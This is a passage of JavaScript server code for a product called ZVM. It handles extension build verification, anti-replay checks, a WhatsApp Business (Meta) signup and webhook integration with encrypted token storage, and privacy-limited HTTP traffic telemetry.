// A exceção é governada SOMENTE pelo master switch legado já existente
// ZVM_LEGACY_V3_ALLOW; não há uma segunda env que possa desligá-la por acidente.
// A exceção NÃO alcança V4, Registry V2, Build Authority, admin ou outras rotas.
const ZVM_SECURITY_CLOCK_SKEW_MS = 15 * 60 * 1000;
const ZVM_SECURITY_REQUEST_TTL_MS = 20 * 60 * 1000;

const ZVM_OFFICIAL_BUILDS = (() => {
  const out = new Map();
  const registryPath = path.join(__dirname, 'zvm-official-builds.json');
  try {
    const parsed = JSON.parse(fs.readFileSync(registryPath, 'utf8'));
    zvmSecurityMergeBuildMaps(out, zvmSecurityBuildMap(parsed));
  } catch (error) {
    console.error('[SEC] Registro local de builds oficiais indisponível:', error.message);
  }
  zvmSecurityMergeBuildMaps(out, zvmSecurityBuildMap(process.env.ZVM_OFFICIAL_BUILDS || ''));
  return out;
})();
const ZVM_DENIED_BUILDS = zvmSecurityBuildMap(process.env.ZVM_DENIED_BUILDS || '');
let ZVM_BUILD_REGISTRY_V2 = new Map();
let ZVM_BUILD_REGISTRY_V2_ERROR = null;
try {
  ZVM_BUILD_REGISTRY_V2 = zvmSecurityLoadRegistryV2(
    path.join(__dirname, 'zvm-build-registry-v2.json'),
    process.env.ZVM_BUILD_REGISTRY_V2_EXTRA_JSON || ''
  );
} catch (error) {
  ZVM_BUILD_REGISTRY_V2_ERROR = error;
}
const ZVM_RUNTIME_ENV = String(process.env.ZVM_RUNTIME_ENV || '').trim().toLowerCase();
const ZVM_DEV_BUILD_ALLOW = ZVM_LOCAL_SAFE_MODE ? false : /^(1|true|yes|on)$/i.test(String(process.env.ZVM_DEV_BUILD_ALLOW || ''));
const ZVM_DEV_COHOST_ALLOW = ZVM_LOCAL_SAFE_MODE ? false : /^(1|true|yes|on)$/i.test(String(process.env.ZVM_DEV_COHOST_ALLOW || ''));
const ZVM_DEV_BUILD_KEY_HASHES = zvmSecurityHashSet(process.env.ZVM_DEV_BUILD_KEY_HASHES || '');
const ZVM_DEV_BUILD_DEVICE_HASHES = zvmSecurityHashSet(process.env.ZVM_DEV_BUILD_DEVICE_HASHES || '');
const ZVM_DEV_LICENSE_KEY_HASHES = zvmSecurityHashSet(process.env.ZVM_DEV_LICENSE_KEY_HASHES || '');
const ZVM_DEV_SIGNED_BUILDS_ALLOW = ZVM_LOCAL_SAFE_MODE ? false : /^(1|true|yes|on)$/i.test(String(process.env.ZVM_DEV_SIGNED_BUILDS_ALLOW || ''));
let ZVM_DEV_SIGNING_CONFIG;
let ZVM_DEV_SIGNING_CONFIG_ERROR = null;
try {
  ZVM_DEV_SIGNING_CONFIG = loadDevBuildSigningConfig(process.env);
} catch (error) {
  ZVM_DEV_SIGNING_CONFIG_ERROR = error;
  ZVM_DEV_SIGNING_CONFIG = Object.freeze({
    enabled: false, keyId: '', privateKey: null, publicKeys: new Map(),
    expectedExtensionId: String(process.env.ZVM_DEV_EXTENSION_ID || '').trim().toLowerCase(),
    agentTokenHash: '', maxBuildAgeMs: 7 * 24 * 60 * 60 * 1000, sessionTtlMs: 12 * 60 * 60 * 1000,
  });
}
const ZVM_DEV_SIGNING_SERVICE = ZVM_DEV_SIGNING_CONFIG.enabled === true && !ZVM_DEV_SIGNING_CONFIG_ERROR
  ? createDevBuildSigningService(ZVM_DEV_SIGNING_CONFIG)
  : null;

async function zvmSecurityConsumeRequestIdSharedImpl(requestId, nowMs = Date.now(), deps = {}) {
  const db = deps.db || await getMongoDb();
  const expiresAt = new Date(Number(nowMs) + ZVM_SECURITY_REQUEST_TTL_MS);
  try {
    await db.collection('extension_security_replay').insertOne({ _id: requestId, createdAt: new Date(Number(nowMs)), expiresAt }, { timeoutMS: ZVM_EXTENSION_AUTH_DB_TIMEOUT_MS });
    return { ok: true };
  } catch (error) {
    if (error?.code === 11000) return { ok: false, code: 'SECURITY_REPLAY_REJECTED' };
    zvmInvalidateMongoOnNetworkError(error, db);
    console.error('[SEC] Anti-replay compartilhado indisponível:', safeScalar(error?.message, 120, 'db_error'));
    return { ok: false, code: 'SECURITY_REPLAY_UNAVAILABLE' };
  }
}

const ZVM_BUILD_AUTHORITY = createBuildAuthority({
  securityProtocol: ZVM_SECURITY_PROTOCOL,
  buildEnforce: ZVM_BUILD_ENFORCE,
  legacyV3Allow: ZVM_LEGACY_V3_ALLOW,
  extensionIds: ZVM_EXTENSION_IDS,
  officialBuilds: ZVM_OFFICIAL_BUILDS,
  deniedBuilds: ZVM_DENIED_BUILDS,
  registryV2: ZVM_BUILD_REGISTRY_V2,
  runtimeEnv: ZVM_RUNTIME_ENV,
  devBuildAllow: ZVM_DEV_BUILD_ALLOW,
  devCohostAllow: ZVM_DEV_COHOST_ALLOW,
  devSignedBuildsAllow: ZVM_DEV_SIGNED_BUILDS_ALLOW,
  devSigningPublicKeys: ZVM_DEV_SIGNING_CONFIG.publicKeys,
  devExtensionId: ZVM_DEV_SIGNING_CONFIG.expectedExtensionId,
  devBuildMaxAgeMs: ZVM_DEV_SIGNING_CONFIG.maxBuildAgeMs,
  devBuildKeyHashes: ZVM_DEV_BUILD_KEY_HASHES,
  devBuildDeviceHashes: ZVM_DEV_BUILD_DEVICE_HASHES,
  clockSkewMs: ZVM_SECURITY_CLOCK_SKEW_MS,
  requestTtlMs: ZVM_SECURITY_REQUEST_TTL_MS,
}, {
  consumeRequestIdShared: zvmSecurityConsumeRequestIdSharedImpl,
});

function legacyV3Allowed() { return ZVM_BUILD_AUTHORITY.legacyV3Allowed(); }
function zvmSecurityBuildRecognized(version, fingerprint) { return ZVM_BUILD_AUTHORITY.buildRecognized(version, fingerprint); }
function zvmSecurityBuildDenied(version, fingerprint) { return ZVM_BUILD_AUTHORITY.buildDenied(version, fingerprint); }
function zvmSecurityStoredSessionAllowed(doc) { return ZVM_BUILD_AUTHORITY.storedSessionAllowed(doc); }
function zvmSecurityStoredSessionDecision(doc) { return ZVM_BUILD_AUTHORITY.storedSessionDecision(doc); }
function zvmSecurityCheckClient(raw, consume, options) { return ZVM_BUILD_AUTHORITY.checkClient(raw, { ...(options || {}), consume: consume === true }); }
function zvmSecurityConsumeRequestIdShared(requestId, nowMs = Date.now(), deps = {}) { return ZVM_BUILD_AUTHORITY.consumeRequestIdShared(requestId, nowMs, deps); }
function zvmSecurityCheckClientShared(raw, options, deps = {}) { return ZVM_BUILD_AUTHORITY.checkClientShared(raw, options, deps); }
function zvmSecurityClientErrorStatus(code) { return ZVM_BUILD_AUTHORITY.clientErrorStatus(code); }
function zvmSecurityDevBuildAllowed(keyCode, deviceId) { return ZVM_BUILD_AUTHORITY.devBuildAllowed(keyCode, deviceId); }

function extensionPublicNotifications() {
  if (!EXTENSION_NOTIFICATIONS_JSON) return [];
  let parsed;
  try { parsed = JSON.parse(EXTENSION_NOTIFICATIONS_JSON); } catch (_) { return []; }
  const list = Array.isArray(parsed) ? parsed : (parsed && Array.isArray(parsed.notifications) ? parsed.notifications : []);
  return list.slice(0, 50).map((raw, index) => {
    raw = raw && typeof raw === 'object' && !Array.isArray(raw) ? raw : {};
    const publishedMs = Date.parse(String(raw.publishedAt || raw.createdAt || raw.date || ''));
    const category = raw.category === 'updates' || raw.type === 'update' || raw.type === 'version' ? 'updates' : 'announcements';
    const priorityRaw = String(raw.priority || 'normal').toLowerCase();
    const priority = ['normal','high','urgent'].includes(priorityRaw) ? priorityRaw : 'normal';
    const out = {
      id: String(raw.id || raw.notificationId || ('notice-' + index)).replace(/[^A-Za-z0-9._:-]/g, '').slice(0, 100) || ('notice-' + index),
      category,
      title: String(raw.title || raw.subject || 'Comunicado').slice(0, 160),
      body: String(raw.body || raw.message || raw.text || '').slice(0, 4000),
      priority,
    };
    if (Number.isFinite(publishedMs)) out.publishedAt = new Date(publishedMs).toISOString();
    return out;
  });
}
function extensionPublicTutorials() {
  const out = new Map();
  if (!EXTENSION_TUTORIALS_JSON) return out;
  let parsed;
  try { parsed = JSON.parse(EXTENSION_TUTORIALS_JSON); } catch (_) { return out; }
  if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) return out;
  for (const [rawKey, rawValue] of Object.entries(parsed).slice(0, 100)) {
    const key = String(rawKey || '').toLowerCase().replace(/[^a-z0-9_-]/g, '').slice(0, 80);
    if (!key) continue;
    try {
      const url = new URL(String(rawValue || ''));
      const host = url.hostname.toLowerCase();
      if (url.protocol !== 'https:' || !['youtube.com','www.youtube.com','youtu.be','www.youtube-nocookie.com'].includes(host)) continue;
      out.set(key, url.toString());
    } catch (_) {}
  }
  return out;
}
const EXTENSION_PUBLIC_NOTIFICATIONS = Object.freeze(extensionPublicNotifications());
const EXTENSION_PUBLIC_TUTORIALS = extensionPublicTutorials();
let _metaIndexesReady = false;
function metaEncryptionKey() {
  if (!META_TOKEN_ENCRYPTION_KEY) return null;
  let key = null;
  if (/^[a-f0-9]{64}$/i.test(META_TOKEN_ENCRYPTION_KEY)) key = Buffer.from(META_TOKEN_ENCRYPTION_KEY, 'hex');
  else {
    try { key = Buffer.from(META_TOKEN_ENCRYPTION_KEY, 'base64'); } catch (_) { key = null; }
  }
  return key && key.length === 32 ? key : null;
}
function metaSecretStorageConfigured() {
  return !!metaEncryptionKey();
}
function metaConfigured() {
  return !!(META_APP_ID && META_APP_SECRET && META_CONFIG_ID && metaSecretStorageConfigured());
}
function metaPublicConfig() {
  return { configured: metaConfigured(), manualConfigured: metaSecretStorageConfigured(), graphVersion: META_GRAPH_VERSION, webhookConfigured: !!META_WEBHOOK_VERIFY_TOKEN };
}
function metaEncrypt(value, aad) {
  const key = metaEncryptionKey();
  if (!key) throw Object.assign(new Error('Meta encryption key unavailable'), { code: 'META_CRYPTO_UNAVAILABLE' });
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  if (aad) cipher.setAAD(Buffer.from(String(aad), 'utf8'));
  const encrypted = Buffer.concat([cipher.update(String(value), 'utf8'), cipher.final()]);
  return { v: 1, alg: 'A256GCM', iv: iv.toString('base64'), tag: cipher.getAuthTag().toString('base64'), data: encrypted.toString('base64') };
}
function metaDecrypt(box, aad) {
  const key = metaEncryptionKey();
  if (!key || !box || box.v !== 1 || box.alg !== 'A256GCM') throw Object.assign(new Error('Meta secret unavailable'), { code: 'META_SECRET_INVALID' });
  const iv = Buffer.from(String(box.iv || ''), 'base64');
  const tag = Buffer.from(String(box.tag || ''), 'base64');
  const data = Buffer.from(String(box.data || ''), 'base64');
  if (iv.length !== 12 || tag.length !== 16 || data.length > 16384) throw Object.assign(new Error('Meta secret invalid'), { code: 'META_SECRET_INVALID' });
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  if (aad) decipher.setAAD(Buffer.from(String(aad), 'utf8'));
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(data), decipher.final()]).toString('utf8');
}
async function ensureMetaIndexes(db) {
  if (_metaIndexesReady) return;
  await Promise.all([
    db.collection(META_FLOW_COLLECTION).createIndex({ expiresAt: 1 }, { expireAfterSeconds: 0, name: 'meta_flow_ttl' }),
    db.collection(META_FLOW_COLLECTION).createIndex({ ownerId: 1, status: 1 }, { name: 'meta_flow_owner_status' }),
    db.collection(META_COLLECTION).createIndex({ phoneNumberId: 1 }, { unique: true, sparse: true, name: 'meta_phone_unique' }),
    db.collection(META_COLLECTION).createIndex({ wabaId: 1 }, { name: 'meta_waba' }),
    db.collection(META_WEBHOOK_COLLECTION).createIndex({ expiresAt: 1 }, { expireAfterSeconds: 0, name: 'meta_webhook_ttl' }),
    db.collection(META_WEBHOOK_COLLECTION).createIndex({ eventKey: 1 }, { unique: true, name: 'meta_webhook_dedupe' }),
  ]);
  _metaIndexesReady = true;
}
function metaError(code, message, status = 502) {
  const error = new Error(message || code); error.code = code; error.status = status; return error;
}
async function metaFetch(pathname, token, options = {}) {
  const clean = String(pathname || '').replace(/^\/+/, '');
  if (!/^[A-Za-z0-9_.?=&,%+\-\/]+$/.test(clean)) throw metaError('META_PATH_INVALID', 'Caminho Meta inválido.', 400);
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 15000);
  try {
    const headers = { Accept: 'application/json', Authorization: 'Bearer ' + token, ...(options.headers || {}) };
    const response = await fetch(`https://graph.facebook.com/${META_GRAPH_VERSION}/${clean}`, { ...options, headers, redirect: 'error', cache: 'no-store', signal: controller.signal });
    const text = await response.text();
    if (Buffer.byteLength(text, 'utf8') > 1024 * 1024) throw metaError('META_RESPONSE_TOO_LARGE', 'Resposta da Meta excedeu o limite seguro.');
    let data = {};
    try { data = text ? JSON.parse(text) : {}; } catch (_) { throw metaError('META_RESPONSE_INVALID', 'A Meta retornou uma resposta inválida.'); }
    if (!response.ok) {
      const msg = safeScalar(data?.error?.message || `Meta HTTP ${response.status}`, 240, 'Falha na Meta');
      const error = metaError('META_HTTP_' + response.status, msg, response.status === 401 || response.status === 403 ? 401 : 502);
      error.metaCode = data?.error?.code || null;
      throw error;
    }
    return data;
  } catch (error) {
    if (error?.name === 'AbortError') throw metaError('META_TIMEOUT', 'A Meta demorou para responder.');
    throw error;
  } finally { clearTimeout(timer); }
}
async function metaExchangeCode(code) {
  code = String(code || '').trim();
  if (!code || code.length > 4096) throw metaError('META_CODE_INVALID', 'Código de autorização inválido.', 400);
  const qs = new URLSearchParams({ client_id: META_APP_ID, client_secret: META_APP_SECRET, code });
  const controller = new AbortController(); const timer = setTimeout(() => controller.abort(), 15000);
  try {
    const response = await fetch(`https://graph.facebook.com/${META_GRAPH_VERSION}/oauth/access_token?${qs.toString()}`, { method: 'GET', headers: { Accept: 'application/json' }, redirect: 'error', cache: 'no-store', signal: controller.signal });
    const data = await response.json().catch(() => ({}));
    if (!response.ok || !data.access_token) throw metaError('META_TOKEN_EXCHANGE_FAILED', safeScalar(data?.error?.message, 220, 'Não foi possível concluir a autorização da Meta.'));
    return String(data.access_token);
  } catch (error) {
    if (error?.name === 'AbortError') throw metaError('META_TIMEOUT', 'A Meta demorou para concluir a autorização.');
    throw error;
  } finally { clearTimeout(timer); }
}
async function metaValidateAccessToken(token) {
  const appToken = `${META_APP_ID}|${META_APP_SECRET}`;
  const data = await metaFetch(`debug_token?input_token=${encodeURIComponent(token)}`, appToken);
  const info = data?.data || {};
  if (info.is_valid !== true || String(info.app_id || '') !== META_APP_ID) throw metaError('META_TOKEN_INVALID', 'A autorização retornada não pertence ao aplicativo ZVM.', 403);
  return info;
}
async function metaValidateAssets(token, wabaId, phoneNumberId) {
  if (!/^\d{5,40}$/.test(wabaId) || !/^\d{5,40}$/.test(phoneNumberId)) throw metaError('META_ASSET_INVALID', 'Identificadores da conta Meta inválidos.', 400);
  const result = await metaFetch(`${wabaId}/phone_numbers?fields=id,display_phone_number,verified_name,quality_rating&limit=100`, token);
  const phones = Array.isArray(result.data) ? result.data : [];
  const phone = phones.find(item => String(item?.id || '') === phoneNumberId);
  if (!phone) throw metaError('META_PHONE_NOT_IN_WABA', 'O número selecionado não pertence à conta WhatsApp Business autorizada.', 403);
  return phone;
}
async function metaSubscribeWaba(token, wabaId) {
  const result = await metaFetch(`${wabaId}/subscribed_apps`, token, { method: 'POST' });
  if (!(result && (result.success === true || result.success === 'true'))) throw metaError('META_SUBSCRIBE_FAILED', 'Não foi possível ativar os webhooks desta conta.');
  return true;
}
function metaRegistrationPin() { return String(crypto.randomInt(0, 1000000)).padStart(6, '0'); }
async function metaRegisterPhone(token, phoneNumberId, pin) {
  const result = await metaFetch(`${phoneNumberId}/register`, token, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ messaging_product: 'whatsapp', pin }) });
  return !!(result && (result.success === true || result.success === 'true'));
}
async function metaResolveOwner(req, body = {}) {
  const bearer = getExtensionBearerToken(req);
  if (bearer) {
    const refreshed = await refreshExtensionSession(bearer).catch(() => null);
    if (!refreshed?.ok || !refreshed.sessionDoc?.subject?.id) return null;
    if (!Array.isArray(refreshed.entitlement?.capabilities) || !refreshed.entitlement.capabilities.includes('integrations.manage')) return null;
    return { ownerId: refreshed.sessionDoc.subject.id, auth: 'v4', subject: refreshed.sessionDoc.subject };
  }
  if (ZVM_BUILD_ENFORCE) return null;
  const keyCode = sanitizeId(body.authKey, 32);
  const deviceId = safeScalar(body.deviceId, 160);
  if (!keyCode || isFreeAuthKey(keyCode) || !deviceId) return null;
  const loaded = await ensureKeyLoadedEx(keyCode);
  if (!loaded.found || loaded.dbError || !extensionLicenseIsUsable(keys[keyCode])) return null;
  return { ownerId: extensionSubject('license', keyCode).id, auth: 'v254-compat', subject: extensionSubject('license', keyCode) };
}
function metaPublicConnection(rec) {
  if (!rec) return null;
  return {
    connectionMode: String(rec.connectionMode || 'embedded') === 'manual' ? 'manual' : 'embedded', wabaId: String(rec.wabaId || ''), phoneNumberId: String(rec.phoneNumberId || ''),
    verifiedName: String(rec.verifiedName || ''), displayPhoneNumber: String(rec.displayPhoneNumber || ''), qualityRating: String(rec.qualityRating || ''),
    graphVersion: META_GRAPH_VERSION, status: String(rec.status || 'connected'), registrationStatus: String(rec.registrationStatus || 'unknown'),
    webhookStatus: String(rec.webhookStatus || 'unknown'), connectedAt: rec.connectedAt || null, lastValidatedAt: rec.lastValidatedAt || null,
  };
}
async function metaGetConnection(ownerId) {
  const db = await getMongoDb(); await ensureMetaIndexes(db);
  return db.collection(META_COLLECTION).findOne({ _id: ownerId });
}
function metaSignupHtml(flowId) {
  const nonce = crypto.randomBytes(18).toString('base64');
  const flow = JSON.stringify(flowId), appId = JSON.stringify(META_APP_ID), configId = JSON.stringify(META_CONFIG_ID), version = JSON.stringify(META_GRAPH_VERSION);
  const html = `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ZVM · Conectar com a Meta</title><style>*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0b141a;color:#e9edef;font-family:system-ui,-apple-system,Segoe UI,sans-serif}.c{width:min(520px,calc(100% - 32px));padding:34px;border:1px solid #26323a;border-radius:22px;background:#111b21;box-shadow:0 28px 70px #0008}.m{width:52px;height:52px;border-radius:16px;display:grid;place-items:center;background:#1877f2;color:white;font-size:28px;font-weight:800}.k{margin-top:18px;color:#8696a0;font-size:11px;font-weight:800;letter-spacing:.12em}h1{font-size:28px;margin:8px 0}p{color:#aebac1;line-height:1.55}button{width:100%;margin-top:18px;border:0;border-radius:12px;padding:13px 16px;background:#1877f2;color:#fff;font-weight:800;cursor:pointer}.s{margin-top:16px;padding:12px;border:1px solid #25313a;border-radius:12px;color:#8696a0;font-size:12px}.ok{color:#21c063}.err{color:#ff6b72}</style></head><body><main class="c"><div class="m">M</div><div class="k">WHATSAPP BUSINESS PLATFORM</div><h1>Conectar com a Meta</h1><p>Entre na sua conta Meta, escolha a empresa e o número do WhatsApp Business e autorize a ZVM.</p><button id="connect">Continuar com a Meta</button><div id="status" class="s">Aguardando início da conexão.</div></main><script nonce="${nonce}">window.fbAsyncInit=function(){FB.init({appId:${appId},autoLogAppEvents:false,xfbml:false,version:${version}})};(function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(d.getElementById(id))return;js=d.createElement(s);js.id=id;js.src='https://connect.facebook.net/pt_BR/sdk.js';js.crossOrigin='anonymous';fjs.parentNode.insertBefore(js,fjs)}(document,'script','facebook-jssdk'));var code='',session={};function st(t,c){var e=document.getElementById('status');e.textContent=t;e.className='s '+(c||'')}function finish(){if(!code||!session.waba_id||!session.phone_number_id)return;st('Concluindo conexão…');fetch('/extension/v3/meta/embedded-signup/complete',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({flowId:${flow},code:code,wabaId:String(session.waba_id),phoneNumberId:String(session.phone_number_id)})}).then(function(r){return r.json().then(function(j){return{r:r,j:j}})}).then(function(x){if(!x.r.ok)throw new Error(x.j.message||x.j.error||'Falha ao concluir');st('Conta conectada. Você pode fechar esta janela.','ok');setTimeout(function(){window.close()},1300)}).catch(function(e){st(e.message,'err')})}function trustedMetaOrigin(origin){try{var u=new URL(String(origin||''));return u.protocol==='https:'&&(u.hostname==='facebook.com'||u.hostname.endsWith('.facebook.com'))}catch(_){return false}}window.addEventListener('message',function(event){if(!trustedMetaOrigin(event.origin))return;try{var d=typeof event.data==='string'?JSON.parse(event.data):event.data;if(!d||d.type!=='WA_EMBEDDED_SIGNUP')return;if(d.event==='FINISH'){session=d.data||{};finish();return}if(d.event==='CANCEL'){st('A conexão foi cancelada antes da conclusão.','err');return}if(d.event==='ERROR'){st(String(d.data&&d.data.error_message||'A Meta não concluiu a conexão.'),'err')}}catch(_){}});document.getElementById('connect').onclick=function(){if(!window.FB){st('Carregando a Meta…');return}st('Abra a janela da Meta e conclua as etapas.');FB.login(function(response){if(response&&response.authResponse&&response.authResponse.code){code=response.authResponse.code;finish()}else st('A autorização não foi concluída.','err')},{config_id:${configId},response_type:'code',override_default_response_type:true,extras:{setup:{},sessionInfoVersion:'3'}})};</script></body></html>`;
  return { html, nonce };
}
function sendMetaSignupHtml(res, payload, status = 200) {
  const csp = `default-src 'none'; script-src 'nonce-${payload.nonce}' https://connect.facebook.net; style-src 'unsafe-inline'; connect-src 'self' https://graph.facebook.com https://www.facebook.com; frame-src https://www.facebook.com https://web.facebook.com; img-src 'self' data: https://www.facebook.com https://static.xx.fbcdn.net; font-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'`;
  res.writeHead(status, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store', 'Content-Security-Policy': csp, 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'Referrer-Policy': 'no-referrer', 'Permissions-Policy': 'camera=(), microphone=(), geolocation=()', 'Cross-Origin-Opener-Policy': 'same-origin-allow-popups' });
  res.end(payload.html);
}
function metaVerifyWebhookSignature(rawBody, signature) {
  if (!META_APP_SECRET || typeof signature !== 'string' || !signature.startsWith('sha256=')) return false;
  const expected = 'sha256=' + crypto.createHmac('sha256', META_APP_SECRET).update(rawBody).digest('hex');
  return safeCompare(signature, expected);
}
function metaWebhookEventKeys(payload, rawBody) {
  const keys = [];
  for (const entry of Array.isArray(payload?.entry) ? payload.entry : []) {
    for (const change of Array.isArray(entry?.changes) ? entry.changes : []) {
      const value = change?.value || {};
      for (const msg of Array.isArray(value.messages) ? value.messages : []) if (msg?.id) keys.push('msg:' + String(msg.id).slice(0, 180));
      for (const st of Array.isArray(value.statuses) ? value.statuses : []) if (st?.id) keys.push('status:' + String(st.id).slice(0, 180) + ':' + String(st.status || '').slice(0, 40));
    }
  }
  if (!keys.length) keys.push('body:' + crypto.createHash('sha256').update(rawBody).digest('hex'));
  return [...new Set(keys)].slice(0, 50);
}
async function storeMetaWebhook(payload, rawBody) {
  const db = await getMongoDb(); await ensureMetaIndexes(db);
  const now = new Date(), expiresAt = new Date(now.getTime() + META_WEBHOOK_RETENTION_DAYS * 86400000);
  const object = safeScalar(payload?.object, 80);
  const entries = Array.isArray(payload?.entry) ? payload.entry : [];
  const summaries = [];
  for (const entry of entries.slice(0, 10)) for (const change of (Array.isArray(entry?.changes) ? entry.changes : []).slice(0, 20)) {
    const value = change?.value || {}, metadata = value?.metadata || {};
    summaries.push({ field: safeScalar(change?.field, 60), wabaId: safeScalar(entry?.id, 60), phoneNumberId: safeScalar(metadata?.phone_number_id, 60), messages: Array.isArray(value.messages) ? value.messages.length : 0, statuses: Array.isArray(value.statuses) ? value.statuses.length : 0 });
  }
  for (const eventKey of metaWebhookEventKeys(payload, rawBody)) {
    await db.collection(META_WEBHOOK_COLLECTION).updateOne({ eventKey }, { $setOnInsert: { eventKey, object, summaries, receivedAt: now, expiresAt } }, { upsert: true }).catch(error => { if (error?.code !== 11000) throw error; });
  }
}

// ── HTTP traffic telemetry (privacy-safe, in-memory only) ───────────────────
// Purpose: identify route amplification without recording IPs, query strings,
// request bodies, license identifiers or user/customer data. Route names are
// reduced to a fixed low-cardinality vocabulary and retained for at most 24h.
const HTTP_TRAFFIC_BUCKET_MS = 5 * 60 * 1000;
const HTTP_TRAFFIC_RETENTION_MS = 24 * 60 * 60 * 1000;
const HTTP_TRAFFIC_MAX_ENTRIES = 4096;
const _httpTrafficBuckets = new Map();
const HTTP_TRAFFIC_PUBLIC_PATHS = new Set([
  '/', '/health', '/status', '/robots.txt', '/hobbies/ssx/ssx2012', '/client/status', '/client/remove-phone',
  '/api/checkkey', '/cakto/webhook', '/meta/webhook', '/faq', '/planos', '/privacidade', '/termos',
  ZVM_BRAND_ICON_ASSET, ZVM_FOUNDER_AVATAR_ASSET,
]);
const HTTP_TRAFFIC_EXTENSION_PATHS = new Set([
  '/v3/key', '/v3/check-status', '/v3/usage', '/v3/get-usage', '/v3/sync-usage',
  '/v4/session/key', '/v4/session/login', '/v4/session/refresh', '/v4/session/logout',
  '/v4/backup/decoder-material', '/v3/meta/embedded-signup/start',
  '/v3/meta/embedded-signup/complete', '/v3/meta/embedded-signup/status', '/v3/meta/manual/connect',
  '/v3/meta/connection/validate', '/v3/meta/messages/test', '/v3/meta/connection/disconnect',
]);
const HTTP_TRAFFIC_ADMIN_PATHS = new Set([
  '/', '/login', '/logout', '/status', '/api/data', '/api/portal-users',
  '/api/ip-blacklist', '/api/session-info', '/api/security/alerts/clear',
  '/api/pentest/run', '/api/pentest/alerts', '/api/export/csv',
  '/api/cakto-queue', '/api/cakto-queue/requeue', '/api/cakto-mail',
  '/api/cakto-mail/requeue', '/api/traffic-summary',
]);
const HTTP_TRAFFIC_ADMIN_KEY_ACTIONS = new Set(['toggle','renew','max-uses','label','phones','note','modules','clear-suspect','dev-access']);

function normalizeTrafficPath(rawUrl) {
  const path = String(rawUrl || '/').split('?')[0] || '/';
  if (HTTP_TRAFFIC_PUBLIC_PATHS.has(path)) return path;

  if (path === R_EXT || path.startsWith(R_EXT + '/')) {
    const suffix = path.slice(R_EXT.length) || '/';
    if (HTTP_TRAFFIC_EXTENSION_PATHS.has(suffix)) return R_EXT + suffix;
    if (suffix.startsWith('/v3/meta/')) return R_EXT + '/v3/meta/other';
    if (suffix.startsWith('/v4/')) return R_EXT + '/v4/other';
    if (suffix.startsWith('/v3/')) return R_EXT + '/v3/other';
    return R_EXT + '/other';
  }

  if (path === R_ADMIN || path.startsWith(R_ADMIN + '/')) {
    const suffix = path.slice(R_ADMIN.length) || '/';
    if (HTTP_TRAFFIC_ADMIN_PATHS.has(suffix)) return '/{admin}' + suffix;
    if (/^\/api\/keys(?:\/batch)?$/.test(suffix)) return '/{admin}' + suffix;
    const keyMatch = suffix.match(/^\/api\/keys\/[^/]+(?:\/([^/]+))?$/);
    if (keyMatch) {
      const action = HTTP_TRAFFIC_ADMIN_KEY_ACTIONS.has(keyMatch[1]) ? '/' + keyMatch[1] : '';
      return '/{admin}/api/keys/:id' + action;
    }
    if (suffix.startsWith('/api/portal-users/')) return '/{admin}/api/portal-users/:id';
    if (suffix.startsWith('/api/')) return '/{admin}/api/other';
    return '/{admin}/other';
  }

  return '/other';
}

function _pruneHttpTraffic(nowMs) {
  const cutoff = nowMs - HTTP_TRAFFIC_RETENTION_MS;
  for (const [key, row] of _httpTrafficBuckets.entries()) {
    if (row.bucketStart < cutoff) _httpTrafficBuckets.delete(key);
  }
  if (_httpTrafficBuckets.size <= HTTP_TRAFFIC_MAX_ENTRIES) return;
  const oldest = [..._httpTrafficBuckets.entries()].sort((a,b) => a[1].bucketStart - b[1].bucketStart);
  for (let i = 0; i < oldest.length - HTTP_TRAFFIC_MAX_ENTRIES; i++) _httpTrafficBuckets.delete(oldest[i][0]);
}

function recordHttpTraffic(method, normalizedPath, statusCode, durationMs, nowMs = Date.now()) {
  const route = normalizeTrafficPath(normalizedPath);
  const verb = /^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)$/.test(String(method || '').toUpperCase()) ? String(method).toUpperCase() : 'OTHER';
  const status = Number.isInteger(Number(statusCode)) && Number(statusCode) >= 100 && Number(statusCode) <= 599 ? Number(statusCode) : 0;
  const bucketStart = Math.floor(Number(nowMs) / HTTP_TRAFFIC_BUCKET_MS) * HTTP_TRAFFIC_BUCKET_MS;
  const key = `${bucketStart}|${verb}|${route}|${status}`;
  const row = _httpTrafficBuckets.get(key) || { bucketStart, method: verb, path: route, status, count: 0, durationTotalMs: 0, durationMaxMs: 0 };
  const elapsed = Math.max(0, Math.min(120000, Number(durationMs) || 0));
  row.count += 1;
  row.durationTotalMs += elapsed;
  row.durationMaxMs = Math.max(row.durationMaxMs, elapsed);
  _httpTrafficBuckets.set(key, row);
  if ((_httpTrafficBuckets.size & 31) === 0) _pruneHttpTraffic(Number(nowMs));
}

function httpTrafficSnapshot(windowMinutes = 60, nowMs = Date.now()) {
  const minutes = Math.max(5, Math.min(1440, parseInt(windowMinutes, 10) || 60));
  const cutoff = Number(nowMs) - minutes * 60 * 1000;
  _pruneHttpTraffic(Number(nowMs));
  const agg = new Map();
  let totalRequests = 0;
  for (const row of _httpTrafficBuckets.values()) {
    if (row.bucketStart + HTTP_TRAFFIC_BUCKET_MS <= cutoff) continue;
    const key = `${row.method}|${row.path}|${row.status}`;
    const out = agg.get(key) || { method: row.method, path: row.path, status: row.status, count: 0, durationTotalMs: 0, maxMs: 0 };
    out.count += row.count;
    out.durationTotalMs += row.durationTotalMs;
    out.maxMs = Math.max(out.maxMs, row.durationMaxMs);
    agg.set(key, out);
    totalRequests += row.count;
  }
  const rows = [...agg.values()].map(row => ({
    method: row.method, path: row.path, status: row.status, count: row.count,
    avgMs: row.count ? Math.round(row.durationTotalMs / row.count) : 0, maxMs: Math.round(row.maxMs),
  })).sort((a,b) => b.count - a.count || a.path.localeCompare(b.path)).slice(0, 64);
  return { windowMinutes: minutes, totalRequests, rows };
}

